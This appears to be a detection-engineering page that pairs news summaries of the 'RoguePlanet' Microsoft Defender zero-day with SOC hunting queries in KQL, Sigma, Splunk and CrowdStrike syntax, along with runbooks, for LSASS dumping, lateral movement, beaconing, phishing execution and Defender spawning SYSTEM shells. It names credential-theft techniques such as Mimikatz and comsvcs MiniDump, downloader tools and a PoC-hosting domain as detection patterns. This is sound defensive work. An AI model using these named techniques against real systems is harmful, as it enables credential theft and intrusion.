LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc

| where NewProcessName endswith "\psexec.exe"
   or NewProcessName endswith "\psexesvc.exe"
   or NewProcessName endswith "\paexec.exe"
   or (NewProcessName endswith "\wmic.exe" and CommandLine has "/node:")
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

Microsoft Defender RoguePlanet Zero-Day Grants SYSTEM Access on Updated Windows

The Hacker News
2026-06-10 9 use cases 4 techniques 6 kill-chain phases detected

The anonymous security researcher going by the name Chaotic Eclipse (aka Nightmare-Eclipse) has released a proof-of-concept (PoC) exploit for yet another Microsoft Defender zero-day named RoguePlanet. "The exploit is a race condition, so it's a hit or miss," the researcher, who published the exploit under a new GitHub account, "MSNightmare" said. "I have managed to get a 100% success rate on

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] DNS / network connection to RoguePlanet PoC publication domain (projectnightcrawler.dev) · Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Microsoft Defender service spawning interactive shell as SYSTEM (RoguePlanet exploit success signature) · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.

DNS / network connection to RoguePlanet PoC publication domain (projectnightcrawler.dev) AIDelivery High
Hunts for any host in the estate resolving or connecting to projectnightcrawler.dev, the publication channel associated with Chaotic Eclipse / MSNightmare's RoguePlanet Defender LPE PoC. First-touch on this domain in an enterprise environment is almost certainly a curious admin or an attacker staging the PoC rather than legitimate business traffic. Rationale: projectnightcrawler.dev is the pre-extracted IOC tied to the Chaotic Eclipse / Nightmare-Eclipse publishing infrastructure for the RoguePlanet PoC. Any internal host reaching this domain is either a curious admin pulling the PoC for testing or — given that the prior three Defender flaws (BlueHammer/UnDefend/RedSun) were exploited in the wild post-disclosure — an attacker staging the LPE. First-touch is high-fidelity because the domain has no legitimate enterprise use. Cross-checked against: • https://attack.mitre.org/techniques/T1588/005/ • https://attack.mitre.org/techniques/T1071/004/
ATT&CKT1588.005 T1071.004 T1105
Data sourcesNetwork_Resolution.DNS Web.Web Network_Traffic.All_Traffic
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Red team or internal vulnerability researcher pulling the PoC to test exposure of patched endpoints
  • Threat-intel analyst accessing the Blogger / GitHub mirror from a SOC workstation
  • Security vendor sandbox detonating malware samples that reference the URL
  • Curious admin reading the THN article and clicking through to the source
Suppression filter
| where InitiatingProcessAccountName !in~ ("redteam-svc", "vuln-researcher") and InitiatingProcessFileName !in~ ("sandboxie.exe", "cuckoo.exe")
Response runbook
1) Triage: identify the user/process initiating the connection — pivot on InitiatingProcessFileName/CommandLine in DeviceNetworkEvents. If it's a browser launched by an IT/security user, validate with the user. 2) Contain: block the domain at the proxy/firewall, isolate the device if a non-browser process (powershell.exe, curl.exe, MsMpEng-spawned shells) initiated the connection, and grab the parent process tree. 3) Hunt: pivot to DeviceProcessEvents on the same host for new SYSTEM-context children of MsMpEng.exe or MpDefenderCoreService.exe (RoguePlanet success signature), check DeviceFileEvents for downloaded .iso / PoC executables, and review the device for the prior Chaotic Eclipse CVEs CVE-2026-33825, CVE-2026-45498, CVE-2026-41091 — patch status and any earlier exploitation IOCs.
let SuspiciousDomain = "projectnightcrawler.dev";
union isfuzzy=true
(DeviceNetworkEvents
  | where Timestamp > ago(30d)
  | where RemoteUrl has SuspiciousDomain
  | project Timestamp, DeviceName, DeviceId, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort),
(DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType in ("DnsQueryResponse", "ConnectionSuccess")
  | where RemoteUrl has SuspiciousDomain or AdditionalFields has SuspiciousDomain
  | project Timestamp, DeviceName, DeviceId, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, AdditionalFields),
(DeviceFileEvents
  | where Timestamp > ago(30d)
  | where FileOriginUrl has SuspiciousDomain or FileOriginReferrerUrl has SuspiciousDomain
  | project Timestamp, DeviceName, DeviceId, InitiatingProcessAccountName, InitiatingProcessFileName, FileName, FolderPath, FileOriginUrl, SHA256)
| order by Timestamp desc
let SuspiciousDomain = "projectnightcrawler.dev";
union isfuzzy=true
(DnsEvents
  | where TimeGenerated > ago(30d)
  | where Name has SuspiciousDomain
  | project TimeGenerated, Computer, ClientIP, Name, QueryType, QueryTypeName, ResultCode, ServerIPAddress),
(CommonSecurityLog
  | where TimeGenerated > ago(30d)
  | where DestinationHostName has SuspiciousDomain or RequestURL has SuspiciousDomain or DestinationDnsDomain has SuspiciousDomain
  | project TimeGenerated, DeviceVendor, DeviceProduct, SourceHostName, SourceIP, DestinationHostName, DestinationDnsDomain, RequestURL, RequestClientApplication, DeviceAction),
(ImDnsActivity
  | where TimeGenerated > ago(30d)
  | where DnsQuery has SuspiciousDomain
  | project TimeGenerated, SrcHostname, SrcIpAddr, DnsQuery, DnsQueryTypeName, DnsResponseCodeName, EventVendor, EventProduct),
(ImWebSession
  | where TimeGenerated > ago(30d)
  | where Url has SuspiciousDomain or HttpHostName has SuspiciousDomain
  | project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, Url, HttpHostName, HttpRequestHeaderUserAgent, EventVendor)
| order by TimeGenerated desc
title: Network or DNS Activity to RoguePlanet Defender Zero-Day PoC Domain
id: 5b2d6f8c-1a9e-4f2b-83d7-7a3e0c4f9d11
description: Detects DNS or HTTP activity to projectnightcrawler.dev, the publication channel for Chaotic Eclipse / MSNightmare's RoguePlanet Microsoft Defender zero-day PoC granting SYSTEM privileges on patched Windows 10/11.
references:
  - https://thehackernews.com/2026/06/microsoft-defender-rogueplanet-zero-day.html
author: SOC Detection Engineering
date: 2026/06/10
tags:
  - attack.command_and_control
  - attack.t1071.004
  - attack.t1105
  - attack.t1588.005
logsource:
  category: dns
  product: windows
detection:
  selection:
    QueryName|contains: 'projectnightcrawler.dev'
  condition: selection
level: high
(source:(windows.sysmon OR windows.defender OR cisco.firepower OR zscaler) AND (@DestinationHostname:*projectnightcrawler.dev* OR @QueryName:*projectnightcrawler.dev* OR @dns.question.name:*projectnightcrawler.dev* OR @http.url:*projectnightcrawler.dev* OR @network.destination.domain:*projectnightcrawler.dev*))
(#event_simpleName=DnsRequest DomainName=/(^|\.)projectnightcrawler\.dev$/i) OR (#event_simpleName=/^NetworkConnect/ RemoteAddressIP4=*)
| case { #event_simpleName=DnsRequest | * } | * 
| groupBy([aid, ComputerName, DomainName, ContextImageFileName, ContextProcessId], function=count())
| sort(count, order=desc)
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(DNS.answer) as answers values(DNS.src) as src_hosts from datamodel=Network_Resolution where (DNS.query="projectnightcrawler.dev" OR DNS.query="*.projectnightcrawler.dev") by DNS.src DNS.query | `drop_dm_object_name(DNS)` | append [| tstats `summariesonly` count from datamodel=Web where (Web.url="*projectnightcrawler.dev*" OR Web.site="projectnightcrawler.dev") by Web.src Web.dest Web.url Web.user | `drop_dm_object_name(Web)`] | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(DNS.answer) as answers values(DNS.src) as src_hosts from datamodel=Network_Resolution where (DNS.query="projectnightcrawler.dev" OR DNS.query="*.projectnightcrawler.dev") by DNS.src DNS.query | `drop_dm_object_name(DNS)` | append [| tstats summariesonly=false count from datamodel=Web where (Web.url="*projectnightcrawler.dev*" OR Web.site="projectnightcrawler.dev") by Web.src Web.dest Web.url Web.user | `drop_dm_object_name(Web)`] | convert ctime(firstTime) ctime(lastTime)
Microsoft Defender service spawning interactive shell as SYSTEM (RoguePlanet exploit success signature) AIExploitation High
Hunts for the post-exploitation signature of a successful RoguePlanet (or BlueHammer/UnDefend/RedSun) Defender LPE: the Defender service process (MsMpEng.exe, MpDefenderCoreService.exe, NisSrv.exe, MpCmdRun.exe) spawning a child cmd.exe / powershell.exe / conhost.exe running in SYSTEM integrity. Defender service should never legitimately launch an interactive shell — when it does, treat it as a confirmed-exploited host. Rationale: The article states that successful RoguePlanet exploitation yields 'a shell with SYSTEM-level privileges' via the Defender process. Because Defender's antimalware service (MsMpEng.exe / MpDefenderCoreService.exe / NisSrv.exe) already runs as SYSTEM, the natural exploitation primitive is to have it spawn the attacker's shell — that parent-child relationship is the high-fidelity signature, and it covers the prior in-the-wild-exploited Chaotic Eclipse flaws (CVE-2026-33825, CVE-2026-45498, CVE-2026-41091) as well. Cross-checked against: • https://attack.mitre.org/techniques/T1068/ • https://attack.mitre.org/techniques/T1211/
ATT&CKT1068 T1211 T1059.003 T1059.001
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • MpCmdRun.exe spawning conhost.exe during scheduled signature update or full scan (legitimate, runs in SYSTEM)
  • Endpoint engineer running MpCmdRun.exe -Scan manually from an elevated shell that re-parents under MpCmdRun
  • Defender Platform Update orchestrator launching cmd.exe to invoke a config script during definition install
  • SecurityHealthService.exe spawning rundll32 to load a notification helper DLL during user-context UI events
  • Third-party EDR using PsExec-like service injection that imitates this parent-child shape
Suppression filter
| where not (InitiatingProcessFileName =~ "MpCmdRun.exe" and FileName =~ "conhost.exe" and isempty(ProcessCommandLine)) and not (InitiatingProcessFileName =~ "SecurityHealthService.exe" and FileName =~ "rundll32.exe" and ProcessCommandLine has "SecurityHealthSSO")
Response runbook
1) Triage: capture the full process tree (parent of MsMpEng.exe, the spawned shell, any grandchildren) and the SHA256 of all three. Validate token: a real Defender update spawns conhost briefly with no follow-on activity; an exploit spawns cmd/powershell that survives and emits child processes (whoami, net, reg, msiexec). 2) Contain: isolate the device via Defender LiveResponse or network containment, kill the shell and its descendants, snapshot memory before reboot. 3) Hunt: pivot to DeviceNetworkEvents from the same DeviceId for projectnightcrawler.dev contact within the prior 24h, search DeviceFileEvents for .iso mounts immediately preceding the shell (the PoC requires standard-user ISO mount), and across the estate query DeviceProcessEvents for any host where Defender process spawned a non-conhost child in SYSTEM context — a single broader hunt to catch unknown variants.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe", "MpCmdRun.exe", "SecurityHealthService.exe", "MsSense.exe")
| where FileName in~ ("cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe", "wscript.exe", "cscript.exe", "rundll32.exe")
| where ProcessIntegrityLevel in ("System", "High") or AccountSid == "S-1-5-18" or AccountName =~ "system"
| extend ParentDir = tostring(split(InitiatingProcessFolderPath, "\\")[-2])
| project Timestamp, DeviceName, DeviceId, AccountName, AccountSid, ProcessIntegrityLevel,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd = InitiatingProcessCommandLine,
          ChildImage = FolderPath,
          ChildCmd = ProcessCommandLine,
          SHA256, InitiatingProcessSHA256
| order by Timestamp desc
union isfuzzy=true
(SecurityEvent
  | where TimeGenerated > ago(7d)
  | where EventID == 4688
  | where ParentProcessName has_any ("\\MsMpEng.exe", "\\MpDefenderCoreService.exe", "\\NisSrv.exe", "\\MpCmdRun.exe", "\\SecurityHealthService.exe", "\\MsSense.exe")
  | where NewProcessName has_any ("\\cmd.exe", "\\powershell.exe", "\\pwsh.exe", "\\conhost.exe", "\\wscript.exe", "\\cscript.exe", "\\rundll32.exe")
  | where SubjectUserSid == "S-1-5-18" or TargetUserSid == "S-1-5-18" or TokenElevationType has "1936"
  | project TimeGenerated, Computer, SubjectUserName, SubjectUserSid, TargetUserSid, NewProcessName, CommandLine, ParentProcessName, TokenElevationType, EventID),
(ImProcessCreate
  | where TimeGenerated > ago(7d)
  | where ParentProcessName has_any ("MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe", "MpCmdRun.exe", "SecurityHealthService.exe")
  | where TargetProcessName has_any ("cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe", "wscript.exe", "cscript.exe", "rundll32.exe")
  | where TargetProcessIntegrityLevel in~ ("System", "High")
  | project TimeGenerated, DvcHostname, ActorUsername, TargetUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine, TargetProcessIntegrityLevel, EventVendor)
| order by TimeGenerated desc
title: Microsoft Defender Service Process Spawning Interactive Shell (RoguePlanet / CVE-2026-33825 / CVE-2026-45498 / CVE-2026-41091 LPE Signature)
id: 7c9f3a21-8d4b-4e6a-9f8c-2b5d7e0a1c3f
description: Detects MsMpEng.exe, MpDefenderCoreService.exe, NisSrv.exe, MpCmdRun.exe or SecurityHealthService.exe spawning cmd.exe, powershell.exe, pwsh.exe, conhost.exe, wscript.exe or cscript.exe — the post-exploitation signature of Chaotic Eclipse's RoguePlanet zero-day and the related BlueHammer / UnDefend / RedSun Defender LPE chain that yields a SYSTEM-level shell.
references:
  - https://thehackernews.com/2026/06/microsoft-defender-rogueplanet-zero-day.html
author: SOC Detection Engineering
date: 2026/06/10
tags:
  - attack.privilege_escalation
  - attack.defense_evasion
  - attack.t1068
  - attack.t1211
  - attack.t1059.001
  - attack.t1059.003
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\MsMpEng.exe'
      - '\MpDefenderCoreService.exe'
      - '\NisSrv.exe'
      - '\MpCmdRun.exe'
      - '\SecurityHealthService.exe'
      - '\MsSense.exe'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\conhost.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\rundll32.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Defender platform updates (MpCmdRun.exe legitimately spawning helper conhost during signature install)
  - Endpoint engineers running manual MpCmdRun.exe scans interactively
level: critical
source:(windows.sysmon OR windows.security OR windows.defender) (@EventID:1 OR @EventID:4688) @ParentImage:(*\\MsMpEng.exe OR *\\msmpeng.exe OR *\\MpDefenderCoreService.exe OR *\\mpdefendercoreservice.exe OR *\\NisSrv.exe OR *\\nissrv.exe OR *\\MpCmdRun.exe OR *\\mpcmdrun.exe OR *\\SecurityHealthService.exe OR *\\securityhealthservice.exe OR *\\MsSense.exe OR *\\mssense.exe) @Image:(*\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\conhost.exe OR *\\wscript.exe OR *\\cscript.exe OR *\\rundll32.exe)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(msmpeng|mpdefendercoreservice|nissrv|mpcmdrun|securityhealthservice|mssense)\.exe$/i
| ImageFileName=/\\(cmd|powershell|pwsh|conhost|wscript|cscript|rundll32)\.exe$/i
| IntegrityLevel="System" OR UserSid="S-1-5-18" OR UserName=/system$/i
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine, UserName, IntegrityLevel], function=count())
| sort(count, order=desc)
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdlines values(Processes.user) as users from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe", "MpCmdRun.exe", "SecurityHealthService.exe")) AND (Processes.process_name IN ("cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe")) by Processes.dest Processes.parent_process_name Processes.process_name Processes.user Processes.process_integrity_level | `drop_dm_object_name(Processes)` | where (user="SYSTEM" OR user="NT AUTHORITY\\SYSTEM" OR process_integrity_level="System") | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process) as cmdlines values(Processes.user) as users from datamodel=Endpoint.Processes where (Processes.parent_process_name IN ("MsMpEng.exe", "MpDefenderCoreService.exe", "NisSrv.exe", "MpCmdRun.exe", "SecurityHealthService.exe")) AND (Processes.process_name IN ("cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe")) by Processes.dest Processes.parent_process_name Processes.process_name Processes.user Processes.process_integrity_level | `drop_dm_object_name(Processes)` | where (user="SYSTEM" OR user="NT AUTHORITY\\SYSTEM" OR process_integrity_level="System") | convert ctime(firstTime) ctime(lastTime)
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("") or RemoteUrl has_any ("projectnightcrawler.dev")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic([""]);
let BadDomains = dynamic(["projectnightcrawler.dev"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)

| order by TimeGenerated desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web

    [| tstats summariesonly=false count

    [| tstats summariesonly=false earliest(_time) AS exec_time

Microsoft Defender 'RoguePlanet' zero-day grants SYSTEM privileges

BleepingComputer
2026-06-09 6 use cases 2 techniques 4 kill-chain phases detected

A security researcher has released a new Microsoft Defender zero-day exploit named "RoguePlanet" just hours after Microsoft fixed two previously disclosed flaws during June 2026 Patch Tuesday. [...]

CVEsCVE-2026-33825
ATT&CKT1021.002 T1190
Domainsprojectnightcrawler.dev
Click any ATT&CK pill below to open it on the Matrix

Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Defender engine reads .vhd/.vhdx/.iso from remote SMB share (RoguePlanet RCE vector) · [LLM] Host resolves or connects to projectnightcrawler.dev (RoguePlanet PoC repository)
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] SYSTEM cmd.exe spawned by Defender MsMpEng.exe (RoguePlanet LPE artifact) · [LLM] Junction or reparse point created targeting Defender ProgramData scan path
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
SYSTEM cmd.exe spawned by Defender MsMpEng.exe (RoguePlanet LPE artifact) AIExploitation High
RoguePlanet's successful exploitation outcome is described in the article as 'a Windows command prompt spawned with SYSTEM privileges' via a Defender race condition. The Defender engine process MsMpEng.exe legitimately runs as SYSTEM but should never spawn cmd.exe — this is the cleanest single-event tell of successful exploitation. Rationale: Article quotes 'a Windows command prompt will be spawned with SYSTEM privileges' as the exploitation outcome. MsMpEng.exe (the Defender antimalware engine) has no legitimate reason to launch cmd.exe — MS-MPI Sigma and CrowdStrike public rules cover related Defender-impersonation paths but not this specific child predicate. Cross-checked: MITRE T1068 (Exploitation for PrivEsc) and Microsoft Defender process documentation. Cross-checked against: • https://attack.mitre.org/techniques/T1068/ • https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-antivirus-windows
ATT&CKT1068 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Defender Application Control / WDAC troubleshooting where vendor scripts invoke cmd via the antimalware service host
  • Microsoft engineers debugging mpengine on Insider/Canary builds (rare, but article notes researcher tested on Canary)
  • Custom EDR remediation tooling that hooks MsMpEng for forensic snapshot extraction
  • Third-party AV uninstallers that temporarily masquerade child processes under the Defender service tree
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("MpCmdRun", "MsMpLics", "SignatureUpdate")) and not(ProcessCommandLine startswith "\"cmd.exe\" /c echo")
Response runbook
Step 1 (triage): pull DeviceProcessEvents for the host ±10min around the alert; confirm parent SHA256 is signed by Microsoft and that ProcessIntegrityLevel=System. Check whether the child cmd then spawns whoami/net/reg or drops files. Step 2 (contain): isolate the device via Defender Live Response, capture memory + Defender Operational/MpSigStub logs, and force a Defender platform update to confirm KB5094126 + any post-disclosure hotfix is present. Step 3 (hunt): pivot on the same DeviceId for DeviceFileEvents touching C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\* with non-Defender writers; sweep org-wide for the same MsMpEng->cmd.exe pattern; check projectnightcrawler.dev DNS hits across the fleet.
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "MsMpEng.exe"
| where FileName =~ "cmd.exe"
| where ProcessIntegrityLevel =~ "System" or AccountName =~ "system"
